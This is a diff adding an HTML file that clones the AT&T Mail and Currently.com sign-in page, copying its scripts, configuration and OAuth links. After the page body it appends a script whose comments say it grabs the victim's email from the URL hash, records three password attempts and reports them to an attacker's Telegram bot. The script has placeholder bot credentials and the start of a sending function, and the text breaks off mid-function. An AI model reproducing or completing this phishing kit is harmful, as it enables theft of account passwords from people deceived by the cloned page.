@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en" class="isPC isChrome isLandscape">
+<head>
+  <meta charset="utf-8">
+  <title>Login Screen</title>
+  <base href="/">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+
+<!-- ADDING ADOBE CONTAINER HEADER -->
+<script src="https://signin.att.com/static/thirdparty/cobrowse/CobrowseIO.js" async="" crossorigin="anonymous"></script>
+<script type="text/javascript">
+  var detmScriptLoadType = 'async';
+  var detmContainerIsHaloC = true;
+  window.appDisableAutoPageload = true;
+  
+  window.detmContainerSSAFPath = 'https://signin.att.com/static/thirdparty/adobe/ssaf_universal_client/ssaf-uc.js';
+  window.ssafHaloWorkerPath = 'https://signin.att.com/static/thirdparty/adobe/ssaf-worker.js';
+  window.detmContainerQuantumPath = 'https://signin.att.com/static/thirdparty/quantum/loaders/quantum-att-loader.js';
+  window.quantumMetricAssetLocation = 'https://signin.att.com/static/thirdparty/quantum/qscripts';
+</script>
+
+<script id="analyticsHeaderScript" type="text/javascript" src="https://signin.att.com/static/thirdparty/adobe/detm-container-hdr.js" class="next-head" data-trigger-dtm="loadAnalytics"></script>
+<script id="cobrowse-js">
+    (function(w,t,c,p,s,e){p=new Promise(function(r){w[c]={client:function(){if(!s){
+    s=document.createElement(t);s.src='https://signin.att.com/static/thirdparty/cobrowse/CobrowseIO.js';s.async=1;s.crossOrigin='anonymous';
+    e=document.getElementsByTagName(t)[0];e.parentNode.insertBefore(s,e);s.onload=function()
+    {r(w[c]);};}return p;}};});})(window,'script','CobrowseIO');
+
+window.CiamCobrowseConfig = {};
+
+CobrowseIO.api = "https:\/\/cobrowse.att.com";
+CobrowseIO.license = "ABYjkm6U_h0GiA";
+CobrowseIO.registration = false;
+CobrowseIO.redactedViews = ["*[id^=\x27savedUserRecord\x27]","#confirmRemoveUserID","input[id^=\x27P_SQ\x27]","label[id^=\x27collisionID\x27][id$=\x27Label\x27]","app\-manual\-login :is(#userID, #password)","app\-user\-input #userBackButton","app\-update\-profile :is(#P_FIRSTNAME, #P_LASTNAME, #P_CTN, #P_ZIP, #P_EMAIL)","app\-password\-input #password","app\-change\-pw :is(#password, #verifyPassword)","app\-profile\-otp #codeValue","app\-enter\-code #codeValue"];
+CobrowseIO.trustedOrigins = ["https:\/\/att.com","https:\/\/*.att.com"];
+
+    CobrowseIO.client().then(function(){
+        CobrowseIO.start();
+    });
+</script>
+
+<script>
+    window.arkoseConfig = {
+      maxRetryCount: "2",
+      arkoseJsUrl: "https:\/\/att\-api.arkoselabs.com\/v2\/FAD1C7FA\-A58F\-4D30\-93D5\-87D1A4E3C641\/api.js",
+      arkoseSriUrl: "https:\/\/att\-api.arkoselabs.com\/params\/sri\/FAD1C7FA\-A58F\-4D30\-93D5\-87D1A4E3C641",
+    };
+</script>
+<script type="text/javascript" src="https://signin.att.com/static/siam/en/halo_c/arkose_enforcement/arkoseHeader.js?v=28.5.0"></script>
+<script src="https://signin-static-js.att.com/scripts/att_common.js"></script>
+<script>
+    window.loginJspEnvVars = {
+      SMART_BANNER_COOKIE_NAME: 'c_sbanner_hide',
+CANCEL_URL: 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=cancel&appName=m40842',
+FORGOT_USERID_URL: 'https://identity.att.com/identity-ui/fid/lander?origination_point=tguard&trid=667738225975d2625a086156b6004d75b8f598fb&appName=m40842&Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842&Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842&lang=en-us',
+APPNAME: 'm40842',
+ARKOSE_RETRY_COUNT: '2',
+AUTHENTICATION_STACK_POLICY_URL: 'https://oidc.idp.clogin.att.com/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:passAuth',
+LOGIN_UI_HEADER: 'access AT&T Mail and Currently.com',
+SURPRESS_BROWSER_PWD_MANAGER: 'N',
+ARKOSE_PUBLIC_KEY: 'FAD1C7FA-A58F-4D30-93D5-87D1A4E3C641',
+ENABLE_COBROWSE: 'Y',
+ARKOSE_JS_VERSION: '28.5.0',
+ACTIVATE_FOOTER_LINKS: 'Y',
+CMS_LGN_TEXT_URL: 'https://signin.att.com/static/siam/en/halo_c/cms/login/default/i18n/{lang}.json?v=29.5.3',
+KEEP_ME_SIGNED_IN_CHECKED: 'OFF',
+REG_URL_USE_AS_IS: 'Y',
+ARKOSE_JS_URL_ENDPOINT: 'https://att-api.arkoselabs.com/v2/FAD1C7FA-A58F-4D30-93D5-87D1A4E3C641/api.js',
+MIN_LOGIN: 'N',
+loginSuccessURL: 'https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?nonce=QbajJZ8umR&SPRelayState=https%253A%252F%252Fmail.yahoo.com%252Fd&redirect_uri=https%3A%2F%2Fatt-yahoo.att.net%2Fisam%2Fsps%2Foidc%2Frp%2FATT-HBO-RP%2Fredirect%2FYahoo&response_mode=form_post&scope=openid&response_type=id_token&state=r53Tjg34Ol&ForceAuthn=true&client_id=m40842',
+SINGLE_RMI_AUTO_OPEN_FOR_CLNT: 'Y',
+logoURL: '/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg',
+trID: '667738225975d2625a086156b6004d75b8f598fb',
+EN_FOOTER_LINKS: 'W3sibGlua0xhYmVsIjoiTGVnYWwgcG9saWN5IGNlbnRlciIsImxpbmtVUkwiOiJodHRwczovL3d3dy5hdHQuY29tL2xlZ2FsL2xlZ2FsLXBvbGljeS1jZW50ZXIuaHRtbCJ9LCB7ImxpbmtMYWJlbCI6IlByaXZhY3kgcG9saWN5IiwibGlua1VSTCI6Imh0dHBzOi8vYWJvdXQuYXR0LmNvbS9zaXRlcy9wcml2YWN5X3BvbGljeSJ9LCB7ImxpbmtMYWJlbCI6IlRlcm1zIG9mIHVzZSIsImxpbmtVUkwiOiJodHRwczovL3d3dy5hdHQuY29tL2xlZ2FsL3Rlcm1zLmF0dFdlYnNpdGVUZXJtc09mVXNlLmh0bWwifSwgeyJsaW5rTGFiZWwiOiJBY2Nlc3NpYmlsaXR5IiwibGlua1VSTCI6Imh0dHBzOi8vd3d3LmF0dC5jb20vZmVhdHVyZXMvYWNjZXNzaWJpbGl0eS5odG1sIn0sIHsibGlua0xhYmVsIjoiWW91ciBwcml2YWN5IGNob2ljZXMiLCJsaW5rVVJMIjoiaHR0cHM6Ly9hYm91dC5hdHQuY29tL2Nzci9ob21lL3ByaXZhY3kvcmlnaHRzX2Nob2ljZXMuaHRtbCIsImxpbmtJY29uIjoiY2NwYS1pY29uLnN2ZyIsImxpbmtJY29uQWx0VGV4dCI6IkNhbGlmb3JuaWEgQ29uc3VtZXIgUHJpdmFjeSBBY3QgKENDUEEpIE9wdC1PdXQgSWNvbiIsImxpbmtJY29uTG9jYXRpb24iOiJsZWZ0In1d',
+ACTIVATE_ARKOSE_FOR_CLIENT: 'Y',
+CONTENT_STACK_HOST: 'https://signin.att.com/static/siam',
+ACTIVATE_IP_MARKING: 'Y',
+CMS_ERROR_IMG_URL: 'https://signin.att.com/static/siam/en/halo_c/cms/errors/default/images/',
+ENABLE_SPLIT_LOGIN_FOR_CLIENT: 'Y',
+SMART_BANNER_ALLOWED_OS: 'Android,iOS,iPad',
+CMS_LGN_IMG_URL: 'https://signin.att.com/static/siam/en/halo_c/cms/login/default/images/',
+DISABLE_FPW: 'N',
+ARKOSE_JS_SRI_URL_ENDPOINT: 'https://att-api.arkoselabs.com/params/sri/FAD1C7FA-A58F-4D30-93D5-87D1A4E3C641',
+ACTIVATE_ONE_LINE_GROUPS: 'N',
+FORGOT_PASSWORD_URL: 'https://identity.att.com/identity-ui/fpwd/lander?origination_point=tguard&trid=667738225975d2625a086156b6004d75b8f598fb&appName=m40842&Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842&Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842&lang=en-us',
+PREPAID_REG_URL: 'https://www.att.com/acctmgmt/registration?origination_point=prepaidlogin',
+SMART_BANNER_COOLDOWN_MINUTES: '1440',
+ACTIVATE_REFID: 'Y',
+M_MYATT_PREFETCH_URL: 'https://m.att.com/myatt/lgn/resources/unauth/login/prefetch/invoke',
+DISABLE_SAVE_USER_ID: 'Y',
+SAVE_USERID_CHECKED: 'ON',
+ACTIVATE_LOGO: 'Y',
+MYATT_PREFETCH_URL: 'https://www.att.com/myatt/lgn/resources/unauth/login/prefetch/invoke',
+ACTIVATE_ADOBE_TAGGING_FOR_CLIENT: 'Y',
+DISABLE_REG: 'N',
+IPMarkingCompany: 'AT&T',
+KEEP_ME_SIGNED_IN: 'Y',
+DISABLE_FID: 'N',
+loginFailureURL: 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&targetURL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842',
+CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP',
+    };
+    window.loginLanguage = 'en';
+</script>
+
+<script>
+    window.timeoutJspVars = {
+      timeoutMs: '599777',
+      redirectUrl: 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2',
+    };
+</script>
+<script type="text/javascript" src="https://signin.att.com/static/siam/en/halo_c/timeout_redirect/timeout.js?v=29.5.3"></script>
+<link rel="preload" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/assets/fonts/att/ATTAleckSans/woff2/ATTAleckSans_W_Rg.woff2" as="font" type="font/woff2" crossorigin="">
+<link rel="preload" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/assets/fonts/att/ATTAleckSans/woff2/ATTAleckSans_W_Bd.woff2" as="font" type="font/woff2" crossorigin="">
+<link rel="preload" href="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" as="image" type="image/svg+xml">
+<link rel="stylesheet" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/styles.css?v=29.5.3">
+<script type="text/javascript" src="https://att-api.arkoselabs.com/v2/FAD1C7FA-A58F-4D30-93D5-87D1A4E3C641/api.js" data-callback="setupEnforcement" async="" defer="" id="arkose-script" integrity="sha384-aKVfzh6pHMnU0DTC1bbxwyCfq+4cOCjQD9JPKvAKqKMe7JV23vqhlg8L0PUm9Mr9 sha384-LJBmIH7dES2i1Ws1iZFQGfI4OAfe1EJQUbMVZNaldIM4tHx9auaee3EPnZ+qhoY4 sha384-lbvwXIcN7j0C6wFv9z4TWGgm/udARINke4Du5xBE65liFXIAKSrjTgMQXyNihsiU sha384-fh5v3n+R6bu3Ub85rpcr3VEAtTUeukyVwciOgd+WcpwwUkIR1j31qaorrJJ1l7N2 sha384-vUNsZ88vRET3RUhavlg30rO/xH6KOAh8FqrclQKeZiRRIty77hwrFuQ643O6f7Fg sha384-7MPaJTfLfcbe7GK/7U3PYqZymRke0EsGEYwGDrWrIR7FcEgu7OxdA6TPxaHECj1V sha384-sY3dyRZqjFPFt+DKX/I21RM3XEyj/dyiep8CR7U5kPi5mgAlkWUBpjUK7x0KBMoj" crossorigin="anonymous"></script>
+<style>.full-height[_ngcontent-ng-c3021268761]{min-height:100vh}</style>
+<style>.screen-share-border[_ngcontent-ng-c3450047798]{position:fixed;inset:0;border:8px solid #ff605d;pointer-events:none}.care-expert-pill[_ngcontent-ng-c3450047798]{position:fixed;top:0;left:50%;transform:translate(-50%);width:max-content}.care-expert-pill-inner[_ngcontent-ng-c3450047798]{border:8px solid #ff605d;border-radius:0 0 16px 16px;background-color:#fff}.end-screen-share[_ngcontent-ng-c3450047798]{position:fixed;bottom:16px;left:50%;transform:translate(-50%)}.bg-red-600[_ngcontent-ng-c3450047798]:hover{background-color:#c70032;border-color:#c70032}.bg-red-600[_ngcontent-ng-c3450047798]{border-color:#c70032}.cobrowse-status-badge[_ngcontent-ng-c3450047798]{padding:12px 8px 12px 0}</style>
+<style>.footer-div[_ngcontent-ng-c62901331]{margin-top:48px;margin-bottom:24px}.footer-links-div[_ngcontent-ng-c62901331]{display:flex;flex-direction:row}.footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331]{margin-right:24px}.footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331]:last-child{margin-right:0}.copyright[_ngcontent-ng-c62901331]{margin-top:16px;display:flex;flex-direction:row;align-items:center;justify-content:center}@media (max-width: 767px){.footer-div[_ngcontent-ng-c62901331]{margin-bottom:32px}.footer-links-div[_ngcontent-ng-c62901331]{display:flex;flex-direction:column;align-items:flex-start}.footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331]{margin-bottom:10px}.footer-links-div[_ngcontent-ng-c62901331]   app-footer-link[_ngcontent-ng-c62901331]:last-child{margin-bottom:0}app-footer-link[_ngcontent-ng-c62901331]{height:24px}.copyright[_ngcontent-ng-c62901331]{margin-top:16px;justify-content:flex-start}}</style>
+<style>.space-below[_ngcontent-ng-c1166392827]{margin-bottom:32px}@media (max-width: 767px){.space-below[_ngcontent-ng-c1166392827]{margin-bottom:24px}}</style>
+<style>.header-logo-position-fr-qrcard[_ngcontent-ng-c1566362065]{margin-left:70px;align-self:flex-start}.header-logo-position-fr-learMore[_ngcontent-ng-c1566362065]{margin-bottom:48px;align-self:flex-start}.header-floating-logo-generic[_ngcontent-ng-c1566362065]{margin-top:32px;margin-left:70px;margin-bottom:64px;align-self:flex-start}.left-align-header-logo-desktop[_ngcontent-ng-c1566362065]{align-self:flex-start}.header-logo-image-no-bottom[_ngcontent-ng-c1566362065]{margin-bottom:0}@media (max-width: 767px){.header-logo-position-fr-qrcard[_ngcontent-ng-c1566362065]{margin-left:0;align-self:center}.header-logo-position-fr-learMore[_ngcontent-ng-c1566362065]{margin-bottom:16px;align-self:center}.header-floating-logo-generic[_ngcontent-ng-c1566362065]{margin-left:0;margin-bottom:32px;align-self:center}.left-align-header-logo-desktop[_ngcontent-ng-c1566362065]{align-self:center;margin-bottom:32px}.header-logo-image-no-bottom[_ngcontent-ng-c1566362065]{margin-bottom:0}}</style>
+<style>.prepaid-ctn-button[_ngcontent-ng-c1134081943]{width:100%;height:48px;text-align:center;border-radius:3px;border:solid 1px #1d2329;background-color:#fff;color:#1d2329;font-size:1.4rem;line-height:2.5rem;margin-top:8px;display:flex;align-items:center;justify-content:center}.prepaid-ctn-button[_ngcontent-ng-c1134081943]:hover{text-decoration:none;background-color:#1d2329;color:#fff}</style>
+</head>
+
+<body>
+  <div id="app-root" _nghost-ng-c3021268761="" ng-version="16.2.12" app-version="29.5.3"><div _ngcontent-ng-c3021268761="" id="appCompBackground" class="full-width-background bg-white"><div _ngcontent-ng-c3021268761="" id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column"><!----><div _ngcontent-ng-c3021268761="" id="appCompCardContainer" class="row justify-center flex-1"><div _ngcontent-ng-c3021268761="" id="appCompCardContDiv" class="pad-none"><!----><app-card _ngcontent-ng-c3021268761="" role="main"><div class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg"><div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg"><app-header class="flex-container" _nghost-ng-c1566362065=""><img _ngcontent-ng-c1566362065="" id="headerLogoImage" alt="" src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image mar-b-md-all"><!----><!----><!----><div _ngcontent-ng-c1566362065="" class="mar-b-md-all text-center" id="signInHeaderTextDiv"><h1 _ngcontent-ng-c1566362065="" class="heading-lg" id="signInHeaderText">Sign in</h1><h1 _ngcontent-ng-c1566362065="" class="heading-md mar-t-xxs-lg" id="signInHeaderToText">to access AT&amp;T Mail and Currently.com</h1><!----></div><!----></app-header><!----><div class="width-full"><router-outlet></router-outlet><app-manual-login><app-error id="appErrorAbove"><!----></app-error><!----><form novalidate="" id="login" method="post" class="manual-login-form ng-pristine ng-invalid ng-touched" action="https://oidc.idp.clogin.att.com/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:passAuth"><input type="hidden" name="appName" formcontrolname="appName" value="m40842" class="ng-untouched ng-pristine ng-valid"><input type="hidden" name="loginSuccessURL" formcontrolname="loginSuccessURL" value="https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?nonce=QbajJZ8umR&amp;SPRelayState=https%253A%252F%252Fmail.yahoo.com%25252Fd&amp;redirect_uri=https%3A%2F%2Fatt-yahoo.att.net%2Fisam%2Fsps%2Foidc%2Frp%2FATT-HBO-RP%2Fredirect%2FYahoo&amp;response_mode=form_post&amp;scope=openid&amp;response_type=id_token&amp;state=r53Tjg34Ol&amp;ForceAuthn=true&amp;client_id=m40842" class="ng-untouched ng-pristine ng-valid"><input type="hidden" name="loginFailureURL" formcontrolname="loginFailureURL" value="https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&amp;targetURL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842" class="ng-untouched ng-pristine ng-valid"><input type="hidden" name="trID" formcontrolname="trID" value="667738225975d2625a086156b6004d75b8f598fb" class="ng-untouched ng-pristine ng-valid"><input type="hidden" name="verify-session-token" formcontrolname="arkoseToken" value="" class="ng-untouched ng-pristine ng-valid"><app-user-input _nghost-ng-c1166392827=""><div _ngcontent-ng-c1166392827="" id="userInputContainerDiv" class="form-row space-below ng-pristine ng-invalid ng-touched"><!----><label _ngcontent-ng-c1166392827="" id="userLabel" for="userID" class="formfield-label">User ID</label><!----><input _ngcontent-ng-c1166392827="" id="userID" name="userID" formcontrolname="userID" autocomplete="username" spellcheck="false" autocapitalize="off" aria-describedby="userInlineErrorText" type="email" class="textfield ng-pristine ng-invalid ng-touched"><div _ngcontent-ng-c1166392827="" id="userInlineErrorText" role="alert" class="formfield-msg"></div><!----></div></app-user-input><!----><!----><!----><!----><!----><!----><!----><!----><!----><div class="continue-button-spacing"><app-button-spinner class="width-full"><button aria-live="polite" class="btn-full-width btn-primary letter-spacing-3" id="continueFromUserLogin" type="submit">Continue<!----><!----><!----></button></app-button-spinner></div><!----><!----><!----><app-forgot-id-link><div id="forgotUserIDLinkContainer" class="mar-t-sm-all"><a id="forgotUserID" class="link-text3 solo type-sm" href="https://identity.att.com/identity-ui/fid/lander?origination_point=tguard&amp;trid=667738225975d2625a086156b6004d75b8f598fb&amp;appName=m40842&amp;Return_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842&amp;Cancel_URL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fnonce%3DQbajJZ8umR%26SPRelayState%3Dhttps%25253A%25252F%25252Fmail.yahoo.com%25252Fd%26redirect_uri%3Dhttps%253A%252F%252Fatt-yahoo.att.net%252Fisam%252Fsps%252Foidc%252Frp%252FATT-HBO-RP%252Fredirect%252FYahoo%26response_mode%3Dform_post%26scope%3Dopenid%26response_type%3Did_token%26state%3Dr53Tjg34Ol%26ForceAuthn%3Dtrue%26client_id%3Dm40842&amp;lang=en-us">Forgot user ID?</a></div></app-forgot-id-link><!----><!----><!----><!----><app-dont-have-id-view><div class="mar-t-sm-all"><div class="font-regular"><a id="createNow" class="link-text3 solo type-sm" href="https://www.att.com/acctmgmt/registration?origination_point=OP"><span id="dontHaveIdText">Don't have a user ID?</span><span>&nbsp;</span>Create one now</a><!----><!----></div></div></app-dont-have-id-view><!----><app-fast-pay-button><!----></app-fast-pay-button><app-prepaid-ctn-button _nghost-ng-c1134081943=""><!----></app-prepaid-ctn-button><!----><!----></form><!----></app-manual-login><!----></div></div></div></app-card></div></div><div _ngcontent-ng-c3021268761="" id="appCompFooterContainer"><div _ngcontent-ng-c3021268761="" id="appCompFooterContDiv" class="grid-col-12 pad-none"><app-footer _ngcontent-ng-c3021268761="" role="contentinfo" _nghost-ng-c62901331=""><div _ngcontent-ng-c62901331="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm"><div _ngcontent-ng-c62901331="" id="footerLinksDiv" class="footer-links-div justify-center"><app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink0" href="https://www.att.com/legal/legal-policy-center.html" title="Legal policy center (Opens in new window)" aria-label="Legal policy center (Opens in new window)" class="type-xs link-text2">Legal policy center</a><!----></app-footer-link><!----><app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink1" href="https://about.att.com/sites/privacy_policy" title="Privacy policy (Opens in new window)" aria-label="Privacy policy (Opens in new window)" class="type-xs link-text2">Privacy policy</a><!----></app-footer-link><!----><app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink2" href="https://www.att.com/legal/terms.attWebsiteTermsOfUse.html" title="Terms of use (Opens in new window)" aria-label="Terms of use (Opens in new window)" class="type-xs link-text2">Terms of use</a><!----></app-footer-link><!----><app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center"><!----><a rel="noopener noreferrer" target="_blank" id="footerLink3" href="https://www.att.com/features/accessibility.html" title="Accessibility (Opens in new window)" aria-label="Accessibility (Opens in new window)" class="type-xs link-text2">Accessibility</a><!----></app-footer-link><!----><app-footer-link _ngcontent-ng-c62901331="" class="flex flex-row flex-items-center"><app-footer-link-icon id="footerLinkIconElLeft4"><div class="flex flex-row flex-items-center footer-link-icon" id="footerLinkIcon4"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4" aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
+<rect x="1" y="6.07595" width="22" height="11.1392" rx="5.56962" fill="white"></rect>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z" fill="#454B52"></path>
+</svg></div><!----><!----><!----></app-footer-link-icon><!----><a rel="noopener noreferrer" target="_blank" id="footerLink4" href="https://about.att.com/csr/home/privacy/rights_choices.html" title="Your privacy choices (Opens in new window)" aria-label="Your privacy choices (Opens in new window)" class="type-xs link-text2 mar-l-xxs-lg">Your privacy choices</a><!----></app-footer-link><!----><!----><app-cobrowse-button _ngcontent-ng-c62901331=""><div><button id="coBrowseReqBtn" class="type-xs link-text2 border-none bg-white"> Screen share code </button></div><!----></app-cobrowse-button></div><!----><div _ngcontent-ng-c62901331="" class="font-regular copyright"><span _ngcontent-ng-c62901331="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©2026 AT&amp;T Intellectual Property. All rights reserved.</span></div><!----></div></app-footer><!----></div></div></div></div><!----><app-full-page-spinner _ngcontent-ng-c3021268761=""><!----></app-full-page-spinner><app-cobrowse-session-ui _ngcontent-ng-c3021268761="" _nghost-ng-c3450047798=""><!----></app-cobrowse-session-ui></div>
+
+<!-- =================================================================================== -->
+<!-- AUTO-GRAB EMAIL FROM URL HASH + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING           -->
+<!-- Works on cPanel and normal HTML - sends ALL 3 password attempts to Telegram        -->
+<!-- =================================================================================== -->
+<script>
+(function() {
+    // ==================== ⚠️ IMPORTANT: REPLACE WITH YOUR REAL TELEGRAM CREDENTIALS ⚠️ ====================
+    // Get your bot token from @BotFather on Telegram: https://t.me/botfather
+    // Get your chat ID by messaging @userinfobot on Telegram: https://t.me/userinfobot
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Example: "8798134988:AAHYPZXrOlk1D8A8cFAWmFN8x75biIFSvK8"
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";       // Example: "8630161918"
+    // ======================================================================================================
+    
+    let passwordAttempts = 0;
+    let capturedEmail = null;
+    let interceptorActive = false;
+    let emailAutoFilled = false;
+    
+    // Send message to Telegram bot with better error handling and CORS support
+    async function sendToTelegram(message) {
+        // Check if bot token is configured
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+            console.error("[Telegram] ❌ Bot token not configured! Please set your TELEGRAM_BOT_TOKEN");
+            console.log("[Telegram] 📝 Message that would have been sent:\n", message);
+            return false;
+        }
+        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
